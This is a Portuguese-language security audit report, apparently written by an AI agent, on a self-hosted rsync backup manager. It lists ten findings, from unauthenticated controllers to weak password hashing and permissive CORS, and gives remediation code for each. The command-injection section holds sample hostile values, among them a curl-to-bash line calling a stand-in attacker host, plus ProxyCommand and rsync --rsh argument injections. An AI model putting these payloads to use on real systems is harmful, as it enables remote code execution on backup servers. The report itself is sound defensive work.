# Relatório de Auditoria de Segurança Cibernética (Cyber Security Assessment)
**Projeto:** Remote Rsync Manager (`remember` / `remote_rsync_manager`)  
**Data da Análise:** 07 de Novembro de 2026  
**Auditor Responsável:** Agente Especialista em Cyber Security  
**Escopo:** Código-fonte Backend (.NET 10), Frontend (React 19 / TypeScript), Containers (Docker / Compose) e Configurações de Rede/Serviços.

---

## 1. Resumo Executivo

O **Remote Rsync Manager** é uma aplicação web voltada para orquestração de backups remotos utilizando `rsync` sobre SSH, com interface web, terminal interativo via WebSockets (SignalR) e sistema de extensões em background.

Embora o projeto apresente boas iniciativas defensivas — como o uso forçado de HTTPS com geração automatizada de certificados PFX, chave temporária de SSH com permissão `0600` e banco de dados separado para logs — a análise aprofundada de segurança identificou **vulnerabilidades críticas** que comprometem gravemente a tríade de segurança (Confidencialidade, Integridade e Disponibilidade).

Os riscos mais severos decorrem de:
1. **Ausência total de autenticação (`[Authorize]`) em múltiplos controllers da API**, permitindo que usuários anônimos na rede leiam chaves privadas SSH, executem comandos, reconfigurem bots e gerenciem planos de backup;
2. **Injeção de comandos (RCE) e injeção de argumentos** ao construir chamadas de processo (`ssh`, `rsync`, `stat`) via interpolação de strings não sanitizadas;
3. **Execução remota de comandos como `root` (RCE)** pelo Terminal interativo e Sistema de Extensões sem restrição de privilégios RBAC;
4. **Política de CORS permissiva com credenciais habilitadas**, permitindo exfiltração de dados e CSRF a partir de qualquer origem web;
5. **Armazenamento de senhas fraco (SHA-256 sem salt)** e credenciais padrão (`admin:admin`).

---

## 2. Quadro Resumo de Vulnerabilidades

| ID | Vulnerabilidade | Severidade | CWE / OWASP | Status |
| :--- | :--- | :--- | :--- | :--- |
| **SEC-01** | Ausência de Autenticação em Controllers Críticos (Vazamento de Chaves SSH e Execução Indevida) | **CRÍTICA** (9.8) | CWE-306 / A01:2021 | Aberto |
| **SEC-02** | Injeção de Comandos e Argumentos em Chamadas de Processos SSH e Rsync | **CRÍTICA** (9.8) | CWE-78, CWE-88 / A03:2021 | Aberto |
| **SEC-03** | RCE e Elevação de Privilégios no Web Terminal e Extensões (Ausência de RBAC e Container Root) | **CRÍTICA** (9.0) | CWE-250, CWE-284 / A01:2021 | Aberto |
| **SEC-04** | CORS Excessivamente Permissivo com Credenciais Habilitadas (Data Theft / CSRF) | **ALTA** (8.5) | CWE-942 / A05:2021 | Aberto |
| **SEC-05** | Armazenamento Inseguro de Senhas (SHA-256 sem Salt) e Credencial Padrão Hardcoded | **ALTA** (8.1) | CWE-328, CWE-916 / A02:2021 | Aberto |
| **SEC-06** | Armazenamento de Chaves Privadas SSH e Segredos em Texto Claro & Permissões 0777 | **ALTA** (7.5) | CWE-312, CWE-732 / A02:2021 | Aberto |
| **SEC-07** | Desativação Completa da Verificação de Host Keys SSH (Vulnerabilidade a MITM) | **MÉDIA** (6.5) | CWE-295 / A07:2021 | Aberto |
| **SEC-08** | Exposição de Tokens JWT em Query String da URL e Falta de Mecanismo de Revogação | **MÉDIA** (5.8) | CWE-598, CWE-613 / A07:2021 | Aberto |
| **SEC-09** | Enumeração Irrestrita do Sistema de Arquivos do Servidor (`FileSystemController`) | **MÉDIA** (5.3) | CWE-22, CWE-200 / A01:2021 | Aberto |
| **SEC-10** | Configuração Insegura de Container em Produção (`CLIENT_DEV_MODE=true` & Root) | **BAIXA** (4.0) | CWE-1188 / A05:2021 | Aberto |

---

## 3. Análise Detalhada dos Problemas e Alternativas de Correção

---

### SEC-01: Ausência de Autenticação em Controllers Críticos (Vazamento de Chaves SSH e Execução Indevida)

- **Severidade:** **CRÍTICA** (CVSS: 9.8 - `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- **Classificação:** CWE-306 (Missing Authentication for Critical Function), OWASP A01:2021 (Broken Access Control)
- **Arquivos Afetados:**
  - `src/server/Controllers/AgentController.cs` (Linhas 13-15)
  - `src/server/Controllers/BackupPlanController.cs` (Linhas 9-11)
  - `src/server/Controllers/TelegramController.cs` (Linhas 9-11)
  - `src/server/Controllers/SettingsController.cs` (Linhas 9-11)
  - `src/server/Controllers/NotificationController.cs` (Linhas 8-10)

#### Mecânica e Impacto:
Nenhum dos controllers citados possui o atributo `[Authorize]`. Isso significa que todas as rotas expostas por eles estão abertas para requisições anônimas.
Entre os impactos imediatos:
1. **Exfiltração de Chaves Privadas SSH:** Qualquer atacante com acesso à porta 5001 pode chamar `GET /api/Agent/{id}/ssh-key` ou listar todos os agentes em `GET /api/Agent` e obter as chaves privadas SSH completas de todos os servidores remotos pareados sem credencial alguma.
2. **Execução e Destruição de Backups:** Qualquer pessoa pode disparar execuções de backup (`POST /api/backupplan/{id}/execute`), alterar destinos de sincronização (`PUT /api/backupplan/{id}`) ou deletar rotinas de backup (`DELETE /api/backupplan/{id}`).
3. **Exfiltração do Bot Token do Telegram:** O endpoint `GET /api/Telegram/config` entrega em texto claro o `botToken` do bot e o `notificationChatId`, e `POST /api/Telegram/send` permite utilizar o servidor como vetor para disparo de mensagens de phishing/spam.

#### Alternativa para Correção:
1. **Solução Imediata (Defesa em nível de classe):**
   Adicionar a diretiva `[Authorize]` em todos os controllers que exigem autenticação.
   ```csharp
   [ApiController]
   [Route("api/[controller]")]
   [Authorize] // <--- Exigir JWT autenticado para qualquer ação do controller
   public class AgentController : ControllerBase
   {
       // ...
   }
   ```
2. **Solução Estrutural (Defesa em Profundidade no `Program.cs`):**
   Exigir autorização por padrão no roteamento de endpoints do ASP.NET Core, liberando explicitamente apenas as rotas públicas (como `/login` e webhooks devidamente assinados):
   ```csharp
   // Program.cs
   builder.Services.AddAuthorization(options =>
   {
       options.FallbackPolicy = new AuthorizationPolicyBuilder()
           .RequireAuthenticatedUser()
           .Build();
   });
   ```
   E decorar apenas o `AuthController.Login` com `[AllowAnonymous]`.

---

### SEC-02: Injeção de Comandos e Injeção de Argumentos em Chamadas de Processos SSH e Rsync

- **Severidade:** **CRÍTICA** (CVSS: 9.8 - `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- **Classificação:** CWE-78 (OS Command Injection), CWE-88 (Improper Neutralization of Argument Delimiters in a Command)
- **Arquivos Afetados:**
  - `src/server/Controllers/AgentController.cs` (Linhas 134, 296, 486-488)
  - `src/server/HostedServices/BackupPlanExecutor.cs` (Linhas 168-175, 695-700)
  - `src/server/Controllers/FileSystemController.cs` (Linhas 210-220)

#### Mecânica e Impacto:
1. **Injeção de Comando Remoto via SSH (`AgentController.BrowseAgentFileSystem`):**
   ```csharp
   var sshCommand = $"ls -la --time-style=full-iso \"{directoryPath}\"";
   var sshArgs = $"-i \"{tempSshKeyFile}\" -p {agent.rsyncPort} ... {sshCommand}";
   ```
   O único filtro aplicado sobre `dir` é `if (directoryPath.Contains(".."))`. Se um usuário passar como parâmetro de consulta `dir` um valor como `"; curl attacker.com/shell.sh | bash; #"` ou `$(id)`, o SSH transmitirá esse comando como payload shell para o servidor remoto, executando comandos arbitrários no agente com as permissões da chave SSH configurada.
2. **Injeção de Argumentos SSH (`-oProxyCommand`):**
   O `hostname` ou `rsyncUser` vindo do request é interpolado diretamente em `ProcessStartInfo.Arguments`. No cliente OpenSSH, argumentos como `-oProxyCommand=exec...` passados antes do hostname provocam a execução local de comandos no servidor do Remember.
3. **Injeção de Argumentos Rsync (`--rsh` / `-e`):**
   Em `BackupPlanExecutor.cs`, `backupPlan.source` e `destination` são concatenados na linha de argumentos do `rsync`. Parâmetros de rsync contendo flags como `--rsh="bash -c evil"` causam execução local de código.
4. **Chamada de Processo Insegura e DoS em `FileSystemController`:**
   Em `GetUnixPermissionsViaStat`, para cada arquivo listado, é invocado `stat -c %a "{path}"`. Além do risco com nomes de arquivo que contenham aspas duplas, disparar 1.000 processos `stat` para uma pasta com 1.000 itens consome todos os PIDs e CPU da máquina (Denial of Service).

#### Alternativa para Correção:
1. **Utilizar `ArgumentList` em vez de `Arguments`:**
   No .NET, `ProcessStartInfo.ArgumentList` não interpola os argumentos via shell, repassando cada item diretamente como um elemento do vetor `argv` para `execv`.
2. **Remover a chamada a `stat` no .NET:**
   O .NET 7/8/9/10 possui a API nativa `File.GetUnixFileMode(path)` que realiza uma syscall direta `stat` em memória C# sem instanciar subprocessos do sistema operacional.
   ```csharp
   // FileSystemController.cs - Correção nativa sem subprocessos:
   private string? GetUnixPermissions(string path)
   {
       try
       {
           if (OperatingSystem.IsLinux() || OperatingSystem.IsMacOS())
           {
               var mode = File.GetUnixFileMode(path);
               // Converte flags para representação octal clássica (ex: 755)
               int permissions = ((int)mode) & 0x1FF;
               return Convert.ToString(permissions, 8).PadLeft(3, '0');
           }
       }
       catch (Exception ex)
       {
           _logger.LogWarning(ex, "Erro lendo permissões de: {Path}", path);
       }
       return null;
   }
   ```
3. **Sanitizar estritamente `directoryPath` e hosts:**
   Validar `Hostname` com regex para aceitar apenas FQDNs válidos (`^[a-zA-Z0-9.-]+$`) ou endereços IP, impedindo caracteres de escape, espaços e opções iniciadas por `-`.

---

### SEC-03: RCE e Elevação de Privilégios no Web Terminal e Extensões (Ausência de RBAC e Container Root)

- **Severidade:** **CRÍTICA** (CVSS: 9.0 - `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`)
- **Classificação:** CWE-250 (Execution with Unnecessary Privileges), CWE-284 (Improper Access Control)
- **Arquivos Afetados:**
  - `src/server/Hubs/TerminalHub.cs` (Linha 7)
  - `src/server/Controllers/ExtensionController.cs` (Linha 14)
  - `src/server/Services/TerminalService.cs` (Linhas 35-47)
  - `src/server/Services/ExtensionExecutor.cs` (Linhas 76-94)
  - `Dockerfile` (Linhas 30-70)

#### Mecânica e Impacto:
1. **Terminal Interativo Aberto para Qualquer Usuário:**
   `TerminalHub` possui apenas `[Authorize]`. O modelo de banco prevê usuários normais e administradores (`isAdmin`), porém a Hub não verifica roles. Qualquer usuário com conta regular no sistema pode abrir uma sessão WebSocket e interagir com `/bin/bash` diretamente no servidor.
2. **Execução em Modo Root:**
   No `Dockerfile`, não é declarado nenhum `USER appuser`. Portanto, o processo Kestrel roda com `uid=0 (root)`. O terminal spawnado em `TerminalService` entrega um shell **root interativo**, com permissão de leitura/gravação total nas pastas montadas `/host` e `/store`, no banco SQLite `server.db` e na rede interna.
3. **Execução de Binários Arbitrários via Extensões:**
   Qualquer usuário autenticado pode subir um arquivo `.zip` e registrar um comando como `bash -c "..."` ou `rm -rf /` em `ExtensionController`, que é executado em segundo plano periodicamente ou sob demanda com privilégios de root.

#### Alternativa para Correção:
1. **Restringir `TerminalHub` e `ExtensionController` com RBAC:**
   Exigir a role `Admin`:
   ```csharp
   [Authorize(Roles = "Admin")]
   public class TerminalHub : Hub { ... }

   [Authorize(Roles = "Admin")]
   public class ExtensionController : ControllerBase { ... }
   ```
2. **Executar o Container com Usuário Não-Root no Dockerfile:**
   Adicionar no `Dockerfile`:
   ```dockerfile
   RUN addgroup --gid 10001 appgroup && \
       adduser --uid 10001 --gid 10001 --disabled-password --gecos "" appuser && \
       chown -R appuser:appgroup /app /store /host
   USER 10001:10001
   ```
3. **Auditoria e Desativação Configurável do Terminal:**
   Permitir desabilitar o `TerminalHub` por variável de ambiente (`ENABLE_WEB_TERMINAL=false`) quando em ambiente de produção sensível.

---

### SEC-04: CORS Excessivamente Permissivo com Credenciais Habilitadas (Data Theft / CSRF)

- **Severidade:** **ALTA** (CVSS: 8.5 - `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`)
- **Classificação:** CWE-942 (Permissive Cross-origin Resource Sharing Policy with Credential Support)
- **Arquivo Afetado:**
  - `src/server/Program.cs` (Linhas 28-38)

#### Mecânica e Impacto:
O código configura o CORS da seguinte forma:
```csharp
builder.Services.AddCors(options =>
{
    options.AddDefaultPolicy(policy =>
    {
        policy.SetIsOriginAllowed(origin => true) // Reflete qualquer origem solicitante
              .AllowAnyMethod()
              .AllowAnyHeader()
              .AllowCredentials(); // Habilita credenciais!
    });
});
```
Navegadores impedem `Access-Control-Allow-Origin: *` junto com `Access-Control-Allow-Credentials: true`. No entanto, ao utilizar `SetIsOriginAllowed(origin => true)`, o ASP.NET Core **reflete dinamicamente a origem exata do invasor** no cabeçalho de resposta, contornando a proteção do browser.
Se um administrador logado no Remember visitar qualquer página maliciosa na internet ou na intranet, o JavaScript dessa página pode emitir requisições autenticadas para `https://localhost:5001/` ou para o IP da aplicação, extrair chaves SSH, roubar dados de backup e disparar chamadas de API.

#### Alternativa para Correção:
Restringir o CORS para apenas as origens legítimas da interface web (ou definir via configuração em `appsettings.json`):
```csharp
var allowedOrigins = builder.Configuration.GetSection("Cors:AllowedOrigins").Get<string[]>() 
                     ?? new[] { "https://localhost:5001" };

builder.Services.AddCors(options =>
{
    options.AddDefaultPolicy(policy =>
    {
        policy.WithOrigins(allowedOrigins)
              .AllowAnyMethod()
              .AllowAnyHeader()
              .AllowCredentials();
    });
});
```
Se o client React estiver sendo servido a partir do mesmo domínio (`wwwroot`), o CORS nem sequer precisa permitir origens externas para a API.

---

### SEC-05: Armazenamento Inseguro de Senhas (SHA-256 sem Salt) e Credencial Padrão Hardcoded

- **Severidade:** **ALTA** (CVSS: 8.1 - `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`)
- **Classificação:** CWE-328 (Use of Weak Hash), CWE-916 (Use of Password Hash With Insufficient Computational Effort), CWE-798 (Use of Hard-coded Credentials)
- **Arquivos Afetados:**
  - `src/server/Services/AuthService.cs` (Linhas 45-50)
  - `src/server/Controllers/UserController.cs` (Linhas 138, 223, 283)
  - `src/server/Program.cs` (Linhas 261-281)

#### Mecânica e Impacto:
1. **Hash SHA-256 sem Salt:**
   ```csharp
   public static string HashPassword(string password)
   {
       using var sha256 = SHA256.Create();
       var hashedBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(password));
       return Convert.ToBase64String(hashedBytes);
   }
   ```
   SHA-256 é uma função criptográfica de alta velocidade para integridade, **inapropriada para senhas**. Sem sal (`salt`) e sem fator de custo (`work factor`), o hash pode ser quebrado em minutos ou segundos usando Rainbow Tables ou placas de vídeo comuns (GPUs testam bilhões de hashes SHA-256 por segundo).
2. **Comparação não constante (Timing Attack):**
   `if (user.passwordHash != passwordHash)` utiliza comparação padrão de string em C#, que retorna falso no primeiro caractere divergente, abrindo margem para ataques de canal lateral baseados em tempo.
3. **Credencial Padrão Previsível:**
   O `Program.cs` cria automaticamente um usuário `admin:admin` e imprime a senha em texto claro no log (`Console.WriteLine`).
4. **Política de Senha Frágil e Troca de Senha Insegura:**
   Apenas valida `request.Password.Length < 3`. Além disso, o endpoint `/api/users/me/change-password` não solicita a senha atual (`CurrentPassword`) para autorizar a modificação.
5. **Ausência de Rate Limiting:**
   O endpoint `/login` não possui limite de tentativas (brute force ilimitado).

#### Alternativa para Correção:
1. **Adotar `PasswordHasher<User>` do ASP.NET Core Identity (PBKDF2 com Salt e Key Derivation):**
   ```csharp
   using Microsoft.AspNetCore.Identity;

   public class AuthService : IAuthService
   {
       private readonly PasswordHasher<User> _hasher = new();

       public string HashPassword(User user, string password)
       {
           return _hasher.HashPassword(user, password);
       }

       public bool VerifyPassword(User user, string password)
       {
           var result = _hasher.VerifyHashedPassword(user, user.passwordHash, password);
           return result == PasswordVerificationResult.Success || 
                  result == PasswordVerificationResult.SuccessRehashNeeded;
       }
   }
   ```
2. **Exigir Senha Atual no ChangePassword:**
   Exigir `CurrentPassword` e validar antes de atribuir a nova senha.
3. **Impor Política de Senhas e Forçar Troca no Primeiro Acesso:**
   Exigir no mínimo 10 a 12 caracteres e flag `mustChangePassword` na primeira autenticação da conta de fábrica.
4. **Adicionar Rate Limiting no Login:**
   Configurar `builder.Services.AddRateLimiter(...)` no .NET 10 para limitar a 5 tentativas por IP/usuário a cada minuto.

---

### SEC-06: Armazenamento de Chaves Privadas SSH e Segredos em Texto Claro & Permissões Inseguras no Disco

- **Severidade:** **ALTA** (CVSS: 7.5 - `AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
- **Classificação:** CWE-312 (Cleartext Storage of Sensitive Information), CWE-732 (Incorrect Permission Assignment for Critical Resource)
- **Arquivos Afetados:**
  - `data/server.db` (Tabelas `agent`, `telegram_config`, `jwt_config`, `certificate_config`)
  - Permissões no diretório `data/` (`-rwxrwxrwx` / 0777 em `server.db`, `server.pfx`)

#### Mecânica e Impacto:
O banco de dados SQLite armazena em texto plano:
- A chave privada SSH (`Agent.rsyncSshKey`) usada para acessar os hosts clientes;
- O segredo de assinatura do JWT (`JwtConfig.secretKey`);
- O token da API do Telegram (`TelegramConfig.botToken`);
- A senha do certificado PFX (`CertificateConfig.certificatePassword`).

Adicionalmente, os arquivos dentro de `data/` no repositório encontram-se com permissão `777` (leitura, escrita e execução para qualquer usuário do sistema operacional host). Qualquer processo comprometido no host ou no container consegue ler as chaves SSH de todos os servidores gerenciados.

#### Alternativa para Correção:
1. **Criptografia em Repouso dos Segredos:**
   Utilizar a API de `IDataProtectionProvider` do ASP.NET Core para cifrar as chaves SSH e o segredo JWT antes de persistir nas entidades EF Core:
   ```csharp
   public class SecretEncryptionService
   {
       private readonly IDataProtector _protector;
       public SecretEncryptionService(IDataProtectionProvider provider)
       {
           _protector = provider.CreateProtector("Remember.SensitiveData.v1");
       }
       public string Encrypt(string plain) => _protector.Protect(plain);
       public string Decrypt(string cipher) => _protector.Unprotect(cipher);
   }
   ```
2. **Restringir Permissões de Arquivos no Startup:**
   Garantir no `Program.cs` e no `entrypoint.sh` que os arquivos de banco de dados e certificados possuam permissões Unix estritas (`chmod 600 data/*.db data/*.pfx`).

---

### SEC-07: Desativação Completa da Verificação de Host Keys SSH (Vulnerabilidade a MITM)

- **Severidade:** **MÉDIA** (CVSS: 6.5 - `AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`)
- **Classificação:** CWE-295 (Improper Certificate / Key Validation)
- **Arquivos Afetados:**
  - `src/server/HostedServices/BackupPlanExecutor.cs` (Linhas 168, 695)
  - `src/server/Controllers/AgentController.cs` (Linhas 134, 296, 487)

#### Mecânica e Impacto:
Em todos os comandos SSH disparados pelo backend, os seguintes parâmetros são forçados:
`-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null`
Ao desativar a verificação de chave do host e direcionar o arquivo `known_hosts` para `/dev/null`, o SSH aceita cegamente qualquer servidor remoto. Se houver um atacante na rede local (ex: ARP spoofing, DNS hijacking ou gateway malicioso), ele poderá se passar pelo agente de backup, inspecionar todo o tráfego transferido ou alimentar o backup com arquivos maliciosos.

#### Alternativa para Correção:
1. **Coleta e Verificação de Host Key (Trust On First Use - TOFU):**
   Ao cadastrar ou parear um novo Agente, o sistema deve obter a fingerprint pública do servidor remoto (`ssh-keyscan -p <port> <hostname>`), gravá-la em um arquivo dedicado (`/app/data/known_hosts`) ou no registro do banco do agente.
2. **Validação nas Execuções Seguintes:**
   Nas execuções subsequentes do `rsync` e validações, utilizar:
   `-o StrictHostKeyChecking=yes -o UserKnownHostsFile=/app/data/known_hosts`
   Isso garante alerta e bloqueio imediato se a chave do servidor remoto for alterada inesperadamente.

---

### SEC-08: Exposição de Tokens JWT em Query String da URL e Falta de Mecanismo de Revogação

- **Severidade:** **MÉDIA** (CVSS: 5.8 - `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N`)
- **Classificação:** CWE-598 (Use of GET Request with Sensitive Query String), CWE-613 (Insufficient Session Expiration)
- **Arquivos Afetados:**
  - `src/server/Program.cs` (Linhas 313-317)
  - `src/client/src/components/Terminal.tsx` (Linhas 82-85)
  - `src/server/Services/TokenStore.cs` (Linhas 23-35)
  - `src/server/Controllers/UserController.cs`

#### Mecânica e Impacto:
1. **Token em Query String:**
   Para conexões SignalR com WebSockets, o cliente envia o token via `?access_token=...`. Tokens presentes na URL são persistidos em logs de acesso HTTP de proxies reversos (Nginx, Traefik, Cloudflare), no histórico do navegador e enviados em cabeçalhos `Referer`.
2. **Ausência de Invalidação no Backend:**
   A classe `TokenStore` mantém uma lista em memória, mas o método `IsTokenValid` **nunca é verificado** pelo middleware do JWT no `Program.cs`. Logo:
   - Se o usuário deslogar, o token continua válido até expirar;
   - Se a senha for alterada em `UserController`, o token roubado anteriormente continuará tendo acesso completo;
   - Se um usuário for desativado (`isActive = false`), seus tokens prévios continuam funcionando.

#### Alternativa para Correção:
1. **Adicionar `SecurityStamp` ao Usuário e Validar no Evento `OnTokenValidated` do JWT:**
   Adicionar um campo `securityStamp = Guid.NewGuid()` na tabela `User`. Sempre que a senha for alterada ou a conta desativada, atualizar o `securityStamp`.
   No `Program.cs`:
   ```csharp
   options.Events = new JwtBearerEvents
   {
       OnTokenValidated = async context =>
       {
           var db = context.HttpContext.RequestServices.GetRequiredService<DBContext>();
           var userIdClaim = context.Principal?.FindFirst(ClaimTypes.NameIdentifier)?.Value;
           if (!Guid.TryParse(userIdClaim, out var userId))
           {
               context.Fail("Unauthorized");
               return;
           }
           var user = await db.Users.FindAsync(userId);
           if (user == null || !user.isActive)
           {
               context.Fail("User is inactive or deleted");
           }
       }
   };
   ```
2. **Utilizar Cookies `HttpOnly` com `SameSite=Strict` para o Handshake do WebSocket:**
   Evita passar o token na query string da URL e previne acesso ao token via JavaScript em ataques XSS.

---

### SEC-09: Enumeração Irrestrita do Sistema de Arquivos do Servidor (`FileSystemController`)

- **Severidade:** **MÉDIA** (CVSS: 5.3 - `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`)
- **Classificação:** CWE-22 (Path Traversal), CWE-200 (Exposure of Sensitive System Information)
- **Arquivo Afetado:**
  - `src/server/Controllers/FileSystemController.cs` (Linhas 29-59)

#### Mecânica e Impacto:
O método `BrowseDirectory` inicia na raiz do disco (`/` no Linux ou `C:\` no Windows) e permite navegar em qualquer diretório onde o processo tenha permissão de leitura.
Embora exista uma validação simples para barrar `..`, um usuário autenticado pode fornecer caminhos absolutos como `/etc`, `/proc`, `/sys`, `/app/data` ou `/root` e mapear completamente os arquivos do servidor hospedeiro.

#### Alternativa para Correção:
Implementar uma restrição em lista branca (chroot lógico) permitindo que o usuário navegue **apenas** dentro dos diretórios destinados a backup ou armazenamento (ex: `/store` e `/host`):
```csharp
var allowedBases = new[] { "/store", "/host" };
var fullPath = Path.GetFullPath(directoryPath);

bool isAllowed = allowedBases.Any(b => fullPath.StartsWith(b, StringComparison.OrdinalIgnoreCase));
if (!isAllowed)
{
    return BadRequest(new { message = "Acesso restrito apenas às pastas de armazenamento (/store e /host)." });
}
```

---

### SEC-10: Configuração Insegura de Container em Produção (`CLIENT_DEV_MODE=true` & Execução como Root)

- **Severidade:** **BAIXA / DEFESA EM PROFUNDIDADE** (CVSS: 4.0 - `AV:L/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L`)
- **Classificação:** CWE-1188 (Insecure Default Initialization of Resource)
- **Arquivos Afetados:**
  - `docker-compose.yml` (Linha 13)
  - `entrypoint.sh` (Linhas 22-30)

#### Mecânica e Impacto:
No `docker-compose.yml`, está configurado:
```yaml
environment:
  - ASPNETCORE_ENVIRONMENT=Production
  - CLIENT_DEV_MODE=true
```
Com isso, o `entrypoint.sh` inicia o servidor de desenvolvimento Vite (`npm run dev`) via HTTP desprotegido em conjunto com o Kestrel, executa `npm install` durante o runtime do container e deixa utilitários de build de desenvolvimento ativos em ambiente rotulado como produção.

#### Alternativa para Correção:
Remover `CLIENT_DEV_MODE=true` do compose de produção e usar exclusivamente a compilação estática servida em `/app/wwwroot`. Garantir que `CLIENT_DEV_MODE` seja reservado a um arquivo `docker-compose.dev.yml` de desenvolvimento local.

---

## 4. Plano de Ação Recomendado (Roadmap de Remediação)

### Fase 1: Correções Emergenciais (Imediato - Sprint 1)
- [ ] Inserir `[Authorize]` nos controllers desprotegidos (`AgentController`, `BackupPlanController`, `TelegramController`, `SettingsController`, `NotificationController`).
- [ ] Aplicar `[Authorize(Roles = "Admin")]` no `TerminalHub` e `ExtensionController`.
- [ ] Corrigir o CORS no `Program.cs`, removendo `SetIsOriginAllowed(_ => true)` e fixando origens seguras.
- [ ] Substituir o uso de `stat` em `FileSystemController` por `File.GetUnixFileMode` e travar a navegação aos caminhos permitidos (`/store`, `/host`).

### Fase 2: Correção Estrutural de Injeção e Criptografia (Sprint 2)
- [ ] Migrar chamadas de processo para `ProcessStartInfo.ArgumentList` em `ssh` e `rsync`.
- [ ] Substituir o hash de senhas SHA-256 por `PasswordHasher<T>` do ASP.NET Core e exigir tamanho mínimo de 12 caracteres.
- [ ] Sanitizar inputs de `dir`, `hostname` e paths contra injeção de parâmetros.
- [ ] Implementar TOFU no SSH com arquivo `known_hosts` gerenciado.

### Fase 3: Hardening e Defesa em Profundidade (Sprint 3)
- [ ] Criptografar chaves privadas SSH e segredos no banco SQLite com `IDataProtectionProvider`.
- [ ] Configurar usuário não-root no `Dockerfile` e ajustar permissões de arquivos para `0600` / `0700`.
- [ ] Desativar `CLIENT_DEV_MODE` em produção e validar `SecurityStamp` para revogação instantânea de JWTs expirados ou modificados.

---
*Relatório concluído e gerado conforme as melhores práticas OWASP Top 10 e CWE Top 25.*
